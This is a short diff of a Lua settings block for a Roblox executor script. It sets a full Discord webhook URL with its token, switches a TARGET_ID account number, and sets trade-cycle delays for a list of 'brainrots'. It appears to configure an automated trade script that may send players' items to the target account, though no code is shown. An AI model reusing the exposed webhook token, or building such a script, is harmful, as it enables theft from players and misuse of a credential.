@@ -1,5 +1,5 @@
 getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1477665939767037987/mltdR8Hc9SmW9utAI4-NbmL7t7OtFEwHd034YuFmm-IyAhbIkjSr8AxGDkVLAmvJXpC1"
-getgenv().TARGET_ID = 1391637698
+getgenv().TARGET_ID = 1718063814
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2 
 getgenv().TARGET_BRAINROTS = {
